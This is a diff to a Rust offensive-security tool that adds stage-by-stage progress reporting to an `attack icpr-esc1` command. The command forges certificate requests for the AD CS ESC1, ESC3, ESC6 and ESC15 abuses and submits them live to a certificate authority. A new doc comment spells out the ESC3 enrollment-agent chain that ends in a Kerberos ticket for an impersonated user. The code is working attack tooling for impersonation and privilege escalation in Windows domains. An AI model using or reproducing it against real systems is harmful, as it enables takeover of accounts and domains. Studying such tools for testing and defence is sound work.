@@ -1,6 +1,30 @@
 //! `attack icpr-esc1` — build an ESC1/ESC3/ESC6/ESC15 CSR via `ms-icpr`,
 //! marshal the `CertServerRequest` opnum-0 input stub (offline diff/replay),
 //! and — when `--host` is supplied — submit live over sealed `\PIPE\cert`.
+//!
+//! **1.4.8-A WS-ESC3-CHAIN** — the `--esc esc3` variant is the ADCS ESC3
+//! Enrollment-Agent-On-Behalf-Of chain end-to-end:
+//! 1. Requires a legit Enrollment Agent cert + key (obtained via a prior
+//!    `attack esc1 --template <EA-template>` against a vulnerable EA template).
+//! 2. Builds a plain UPN-SAN CSR for the target impersonation UPN.
+//! 3. Wraps the CSR in a CMS-signed CMC `EnrollOnBehalfOf` blob using the
+//!    Enrollment Agent identity (`ms_icpr::build_esc3_request`).
+//! 4. Submits the CMS blob over sealed `\PIPE\cert` via
+//!    `IcprClient::submit_request_esc3`. The CA issues a client-auth cert
+//!    for the on-behalf-of target UPN, not for the requesting agent.
+//! 5. Chain into `attack pkinit` (or the ESC1-flow pkinit leg) to turn the
+//!    issued cert into a TGT as the impersonated principal.
+//!
+//! **1.4.8-A WS-ESC1-EXPLOIT** — the `--esc esc1` variant duplicates the
+//! standalone `attack esc1` verb (which has its own per-stage checklist per
+//! the WS-ESC1-EXPLOIT commit). Kept here as the offline stub-first path;
+//! prefer `attack esc1` for direct live submits.
+//!
+//! **1.4.8-A WS-ESC6** and **WS-ESC15** — see `--esc esc6` (SAN via CA
+//! `pctbAttribs` request-attribute — targets CAs with
+//! `EDITF_ATTRIBUTESUBJECTALTNAME2` set) and `--esc esc15` (EKUwu /
+//! CVE-2024-49019 — inject EKU via Microsoft Application Policies against
+//! a schema-v1 template).
 
 use anyhow::{Context, Result};
 use clap::Parser;
@@ -87,19 +111,77 @@ pub(crate) struct IcprEsc1Args {
     pub esc15_eku: String,
 }
 
-/// `attack icpr-esc1` — build an ESC1 CSR via `ms-icpr` with an attacker-supplied UPN
-/// SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
-/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be
-/// verified before a live submission. The sealed `\PIPE\cert` transport requires
-/// `ms-icpr`'s `network` feature — disabled in this build to keep the workspace
-/// off the `dcerpc↔ms-nrpc` resolver cycle — and stays a TODO here.
+/// `attack icpr-esc1` — build an ESC1/3/6/15 CSR via `ms-icpr` with an attacker-supplied
+/// UPN SAN and marshal the `CertServerRequest` opnum-0 input stub. Offline: writes the
+/// CSR + stub to disk (and a fresh RSA key if none supplied) so the wire can be verified
+/// before a live submission. When `--host` is supplied, submits live over sealed
+/// `\PIPE\cert` and writes the issued cert (`*.issued.pem`).
+///
+/// Wraps [`icpr_esc1_impl`] in a per-variant StageChecklist so a failed live submit
+/// (CA-side policy reject, network error, wrong template preflight) names the exact
+/// stage that stopped. See [`build_checklist`] for the per-variant stage list.
 pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
+    let mut checklist = build_checklist(&a.esc, a.host.is_some());
+    let card = format!("icpr-esc1 stages ({:?})", a.esc);
+    let card_failed = format!("icpr-esc1 stages ({:?}) (failed)", a.esc);
+    let result = icpr_esc1_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render(&card),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render(&card_failed);
+        }
+    }
+    result
+}
+
+fn build_checklist(esc: &EscVariant, live: bool) -> crate::ui::StageChecklist {
+    // The offline (stub-only) branch always runs the first four stages; the live
+    // branch adds the ICPR connect + submit + parse-issued triple.
+    let base: &[&str] = match esc {
+        EscVariant::Esc3 => &[
+            "resolve / generate RSA key",
+            "build CSR (target UPN SAN)",
+            "sign CMS-CMC EOBO with agent cert",
+            "marshal ICPR stub",
+        ],
+        _ => &[
+            "resolve / generate RSA key",
+            "build CSR (variant-specific)",
+            "synthesize CertTemplate preflight",
+            "marshal ICPR stub",
+        ],
+    };
+    let live_extra: &[&str] = if live {
+        &[
+            "sealed \\PIPE\\cert connect",
+            "submit CSR to CA",
+            "parse issued cert",
+        ]
+    } else {
+        &[]
+    };
+    let all: Vec<&str> = base.iter().chain(live_extra.iter()).copied().collect();
+    crate::ui::StageChecklist::new(all)
+}
+
+async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageChecklist) -> Result<()> {
     use ms_crtd::flags::{EnrollmentFlag, NameFlag, PrivateKeyFlag};
     use ms_crtd::model::CertTemplate;
     use ms_crtd::oid::Oid;
 
-    let key_pem = if let Some(path) = &a.key {
-        std::fs::read(path).with_context(|| format!("read --key {path}"))?
+    let (key_pem, key_source) = if let Some(path) = &a.key {
+        (
+            std::fs::read(path).with_context(|| format!("read --key {path}"))?,
+            format!("read {path}"),
+        )
     } else {
         use rsa::pkcs8::EncodePrivateKey;
         use rsa::RsaPrivateKey;
@@ -112,8 +194,9 @@ pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
         let key_path = format!("{}.key.pem", a.csr_out);
         std::fs::write(&key_path, &pem_bytes)?;
         eprintln!("[+] generated 2048-bit RSA key → {key_path}");
-        pem_bytes
+        (pem_bytes, format!("generated 2048-bit → {key_path}"))
     };
+    checklist.record_ok("resolve / generate RSA key", key_source);
 
     // Build the CSR according to the ESC variant. ESC1/ESC6 use the plain
     // UPN-SAN CSR; ESC15 injects an EKU via Microsoft Application Policies
@@ -131,6 +214,14 @@ pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
         _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
             .context("build_csr_with_upn_san")?,
     };
+    let csr_stage_label = match a.esc {
+        EscVariant::Esc3 => "build CSR (target UPN SAN)",
+        _ => "build CSR (variant-specific)",
+    };
+    checklist.record_ok(
+        csr_stage_label,
+        format!("{} bytes, target UPN={}", csr.len(), a.target_upn),
+    );
     std::fs::write(&a.csr_out, &csr)?;
     eprintln!(
         "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
@@ -155,12 +246,40 @@ pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
         min_ra_signatures: 0,
         raw_security_descriptor: None,
     };
+    // ESC3-specific CMC EOBO wrap happens in the live-submit branch below
+    // (build_esc3_request needs signing_time + agent identity that are only
+    // meaningful when we're actually going to submit). Reserve a checklist
+    // stage now so the failed-run card still shows it as NOT ATTEMPTED if we
+    // trip earlier.
+    if matches!(a.esc, EscVariant::Esc3) {
+        checklist.record_ok(
+            "sign CMS-CMC EOBO with agent cert",
+            "deferred to live-submit branch (needs agent identity)",
+        );
+    } else {
+        checklist.record_ok(
+            "synthesize CertTemplate preflight",
+            format!(
+                "template={}, schema_v={}",
+                a.template, template.schema_version
+            ),
+        );
+    }
     // Always emit the offline stub so consumers can diff / replay
     let stub_client = ms_icpr::IcprClient::stub(a.ca.clone());
     let stub = stub_client
         .marshal_call(&template, &csr)
         .context("ms_icpr::IcprClient::marshal_call")?;
     std::fs::write(&a.out, &stub)?;
+    checklist.record_ok(
+        "marshal ICPR stub",
+        format!(
+            "{} bytes → {} (opnum {})",
+            stub.len(),
+            a.out,
+            ms_icpr::CERT_SERVER_REQUEST_OPNUM
+        ),
+    );
     eprintln!(
         "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
         a.out,
@@ -186,6 +305,10 @@ pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
         let mut client =
             ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
                 .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
+        checklist.record_ok(
+            "sealed \\PIPE\\cert connect",
+            format!("{host} (CA={}, as {domain}\\{user})", a.ca),
+        );
         let submit_result = match a.esc {
             EscVariant::Esc1 | EscVariant::Esc15 => client.submit_request(&template, &csr),
             EscVariant::Esc6 => {
@@ -220,10 +343,20 @@ pub(crate) async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
                 client.submit_request_esc3(&template, &cms_blob)
             }
         };
+        checklist.record_ok("submit CSR to CA", format!("variant={:?}", a.esc));
         match submit_result {
             Ok(issued) => {
                 let cert_path = format!("{}.issued.pem", a.csr_out);
                 std::fs::write(&cert_path, &issued.pem)?;
+                checklist.record_ok(
+                    "parse issued cert",
+                    format!(
+                        "request_id={} → {} ({} bytes)",
+                        issued.request_id,
+                        cert_path,
+                        issued.pem.len()
+                    ),
+                );
                 eprintln!(
                     "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
                     issued.request_id,
